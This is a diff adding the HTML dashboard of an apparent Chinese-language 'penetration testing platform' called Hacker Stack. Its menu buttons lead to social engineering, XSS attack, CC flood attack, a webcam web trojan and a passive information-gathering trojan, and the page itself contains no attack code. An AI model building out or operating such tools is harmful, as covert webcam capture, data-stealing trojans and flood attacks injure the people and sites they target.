@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8" />
+        <title>Hacker Stack - 在线渗透测试平台</title>
+        <script src="./js/md5.js"></script>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link href="../css/system.css" rel="stylesheet" />
+        <script src="/resource/javascript/config.js"></script>
+        <script src="../js/system.js"></script>
+        <script src="../js/libui.js"></script>
+    </head>
+    <body style="height: 100%;">
+        <iframe src="../bg.html" style="border: none;width: 100%;height: 100%;position: absolute;"></iframe>
+        <div style="padding: 30px;position: absolute;width: 100%;">
+            <Div style="width: 100%;">
+                <span class="card_1">
+                    <p style="color: green;">功能面板</p>
+                    <button class="btn_2" onclick="to_social()">社会工程学</button>
+                    <button class="btn_2" onclick="to_xss_attack()">XSS脚本攻击</button>
+                    <button class="btn_2">网站信息引擎(开发ing)</button>
+                    <button class="btn_2" onclick="to_ip_location()">IP定位</button>
+                    <button class="btn_2" onclick="to_whois()">Whois查询</button>
+                    <button class="btn_2" onclick="window.open('//154.9.253.147:60001')">Google反向代理</button>
+                    <button class="btn_2" onclick="make_qrcode()">二维码生成</button>
+                    <button class="btn_2" onclick="window.open('//chatnio.net/')">ChatNIO人工智能</button>
+                    <button class="btn_2" onclick="to_cc_attack()">CC攻击</button>
+                    <button class="btn_2" onclick="to_video_attack()">摄像头网页木马(Beta)</button>
+                    <button class="btn_2" onclick="to_VirusInfoGetter()">被动式信息收集木马</button>
+                </span>
+                <iframe id="page" src="./default.html" class="card_2">
+                    
+                </iframe>
+                <iframe src="https://chatnio.net/" class="card_3">
+                    
+                </iframe>
+            </Div>
+        </div>
+    </body>
+</html>
